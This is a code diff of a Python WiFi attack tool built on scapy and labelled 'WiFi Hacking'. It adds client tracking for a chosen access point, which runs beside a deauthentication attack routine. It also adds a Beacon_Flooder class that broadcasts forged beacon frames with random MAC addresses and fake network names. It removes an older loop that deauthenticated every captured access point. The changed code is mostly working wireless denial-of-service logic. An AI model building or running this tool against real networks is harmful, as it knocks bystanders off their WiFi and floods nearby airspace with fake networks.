@@ -12,7 +12,7 @@ console = Console()
 
 # NETWORK IMPORTS
 import pywifi, socket, ipaddress
-from scapy.all import sniff, RadioTap, IP, ICMP, sr1, sendp
+from scapy.all import sniff, RadioTap, IP, ICMP, sr1, sendp, RandMAC
 from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth
 
 
@@ -56,8 +56,8 @@ class Frame_Snatcher():
 
 
     
-    @staticmethod
-    def welcome_ui(text="    WiFi \nHacking", font="dos_rebel", c1="bold red", c2="bold purple", skip=False):
+    @classmethod
+    def welcome_ui(cls, text="    WiFi \nHacking", font="dos_rebel", c1="bold red", c2="bold purple", skip=False):
         """This method will house the welcome message"""
 
 
@@ -74,9 +74,10 @@ class Frame_Snatcher():
             
             print('\n\n')
             console.print(welcome, style=c2)
+            console.print(f"\n[bold red]Current iface:[bold green] {cls.iface}\n\n")
             if skip == False:
                 console.input("[bold red]Press ENTER to Sniff! ")
-            print('\n\n\n')
+            print('\n')
 
 
         
@@ -135,6 +136,11 @@ class Frame_Snatcher():
                 
                 # KEEP LOOPING UNTIL TRUE
                 if cls.beacons:
+                    
+
+                    # SNIFF AGAIN
+                    sniff(iface=iface, prn=Frame_Snatcher.packet_parser, count=0, store=0, timeout=15)
+
                     break
         
 
@@ -220,6 +226,96 @@ class Frame_Snatcher():
                 # NOW TO OUTPUT RESULTS
                 console.print(f"[{c2}][+] Found MAC addr:[{c4}] {addr2}")
 
+   
+
+
+    
+    @classmethod
+    def track_clients(cls, target, iface, track=True, delay=5):
+        """This method will be responsible for tracking the online clients"""
+
+
+        # DESTROY ERRORS
+        verbose = True
+
+        
+        # CREATE A CLIENT LIST
+
+        def sniff_for_clients(timeout=0):
+            """This will be used to sniff for clients"""
+
+
+            console.print("\n -----  SNIFF STARTED  ----- ", style="bold green")
+            
+
+            # BEGIN THE SNIFF
+            sniff(iface=iface, prn=parse_for_clients, count=0, store=0), #timeout=timeout)
+        
+            console.print("\n -----  SNIFF ENDED  ----- ", style="bold red")
+
+
+
+        def parse_for_clients(pkt):
+            """This will be used to parse for clients"""
+
+            
+
+            # FILTER FOR WIFI FRAMES
+            if pkt.haslayer(Dot11):
+
+
+                # ADDR VARS
+                addr1 = pkt.addr1 if pkt.addr1 != "ff:ff:ff:ff:ff:ff" else False
+                addr2 = pkt.addr2 if pkt.addr2 != "ff:ff:ff:ff:ff:ff" else False
+ 
+                
+                # VALID CLIENTS ONLY
+                if addr1 == target or addr2 == target:
+
+                    
+                    
+                    # ADDR1
+                    if addr1 != target and addr1 not in cls.clients and addr1:
+
+
+                        # ADD TO LIST
+                        cls.clients.append(addr1)
+
+                        if verbose:
+                            console.print(f"Client: {addr1} --> {target}")
+
+                   
+   
+                    # ADDR2
+                    elif addr2 != target and addr2 not in cls.clients and addr2:
+
+
+                        # ADD TO LIST
+                        cls.clients.append(addr2)
+
+                        if verbose:
+                            console.print(f"Client: {addr2} --> {target}")
+
+
+
+        # START TRACKING CLIENTS
+        threading.Thread(target=sniff_for_clients, daemon=True).start()
+
+        
+
+        #console.print("----- STARTED -----", style="bold green")
+        time.sleep(10)
+
+        # LOOP THIS BITCH
+        while True:
+            
+            # RESET CLIENT LIST
+            cls.clients = []
+            console.print("wiped", style="bold red")
+            time.sleep(delay)
+
+
+
 
 
     @classmethod
@@ -280,7 +376,7 @@ class Frame_Snatcher():
             choice = console.input("[bold red]Do you want to rescan?[bold green] (y/n): ").strip().lower()
 
 
-            if choice in [1, "yes", "y", "go", "yea"]:
+            if choice in ["1", "yes", "y", "go", "yea"]:
 
                 
                 
@@ -418,7 +514,7 @@ class Frame_Snatcher():
 
 
         # LOOP UNTIL CTRL + C
-        with Live(panel, console=console, refresh_per_second=1):
+        with Live(panel, console=console, refresh_per_second=4):
 
 
             # UPDATE RENDERABLE THIS IS THE COUNTDOWN UNTIL START
@@ -455,7 +551,13 @@ class Frame_Snatcher():
                     # COLORS
                     c1 = "bold red"
 
-                    panel.renderable = f"[{c1}]Target:[/{c1}] {target}  -  [{c1}]Total Packets Sent:[/{c1}] {packets_sent}  -  [{c1}]Reason:[/{c1}] {reasons}"
+                    panel.renderable = (
+                        f"[{c1}]Target:[/{c1}] {target}  -  " 
+                        f"[{c1}]Total Packets Sent:[/{c1}] {packets_sent}  -"  
+                        f"[{c1}]Reason:[/{c1}] {reasons}  -  "  
+                        f"[{c1}]Clients:[/{c1}] {len(cls.clients)}"
+
+                        )
                     
             
 
@@ -493,10 +595,14 @@ class Frame_Snatcher():
         cls.macs = []
         cls.beacons = []
         cls.num = 1
+        cls.clients = []
 
         
         # GET GLOBAL IFACE
-        iface = "wlan1"
+        cls.iface = console.input("Enter Interface: ").strip() 
+
+        if cls.iface == "":
+            cls.iface = "wlan0"
 
 
         # PRINT WELCOME UI
@@ -504,15 +610,19 @@ class Frame_Snatcher():
 
         
         # SNIFF FOR TARGETS
-        Frame_Snatcher.sniff_for_targets(iface=iface)
+        Frame_Snatcher.sniff_for_targets(iface=cls.iface)
 
 
         # ALLOW THE USER TO CHOOSE THERE TARGET
         target = Frame_Snatcher.target_chooser()
 
 
+        # NOW TO TRACK THE AMOUNT OF CLIENTS ON THE AP
+        threading.Thread(target=Frame_Snatcher.track_clients, args=(target, cls.iface), daemon=True).start()
+
+
         # NOW TO ATTACK THE TARGET
-        Frame_Snatcher.target_attacker(target=target, iface=iface)      
+        Frame_Snatcher.target_attacker(target=target, iface=cls.iface)      
 
 
 
@@ -524,56 +634,53 @@ class Frame_Snatcher():
 
 
 
-    
+
+
+class Beacon_Flooder():
+    """This class will be responsible for performing beacon attacks and maybe Probe flooding """
+
+
+
+    def __init__(self):
+        pass
+
+
+
     @classmethod
-    def sniffer_scapy(cls, iface="wlan0", verbose=1, timeout=15):
-        """This method will be used to sniff out mac addresses using the sniff function"""
-
-        # COUNT THE ATTEMPTS
-        tempt = 1   
+    def beacon_packet(cls):
+        """Create the beacon packet"""
 
 
-        # LOOP THAT BITCH
-        while True:
-
-            
-            # OUTPUT ATTEMPT
-            console.print(f"Sniff Attempt #{tempt}", style="bold green")
-
-                
-            # SNIFF THAT BITCH
-            sniff(iface=iface, prn=Frame_Snatcher.packet_parser, count=0, store=0, timeout=15)
-            
-            # APPEND TEMPT
-            tempt += 1
-
-            
-            # KEEP LOOPING UNTIL TRUE
-            if cls.beacons:
-                break
+        # VARS
+        num = 0
+        ssids = [
+            "I AM NOT REAL",
+            "HOWDY HOW ARE YOU DOING",
+            "TESTING WPA ACCESS",
+            "THIS IS FOR UR SAFETY",
+            "HEY HEY HEY",
+            "DUDE DUE DUE"
+        ]
 
         
-        go = 100
+        while num < 5:
 
 
-        if cls.beacons:
-
-            while go >= 0:
-                for mac in cls.beacons:
-
-                #threading.Thread(target=Deauth_You.death_all, args=("ff:ff:ff:ff:ff:ff", mac), daemon=True).start()
-
-                    Deauth_You.death_all(client_mac="ff:ff:ff:ff:ff:ff", ap_mac=mac)
-                    time.sleep(.5)
-
-                    go -= 1
+            # GET A RANDOM MAC
+            mac = RandMAC()
+            ssid = random.choice(ssids)
 
 
-                    console.print(f"[bold red]Loop #:[bold blue] {go}")
+            frame = RadioTap() / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac) / Dot11Beacon(cap="ESS+privacy") / Dot11Elt(ID="SSID", info=ssid)
+
+
+            sendp(frame, inter=0.1, count=1, iface="wlan1")
+
+            num += 1
         
 
-        else:
-            console.print("Failed to capture macs / frames", style="bold red")
+
+    
 
 
 
@@ -783,8 +890,9 @@ class You_Cant_DOS_ME():
 
 # FOR MODULE TESTING
 if __name__ == "__main__":
+    
 
-    use = 1
+    use = 3
 
 
     if use == 1:
@@ -792,7 +900,15 @@ if __name__ == "__main__":
     
 
 
-    if use == 3:
+    elif use == 2:
         You_Cant_DOS_ME.ping()
+
+
+    
+    elif use == 3:
+
+
+        Beacon_Flooder.beacon_packet()
+
 
 
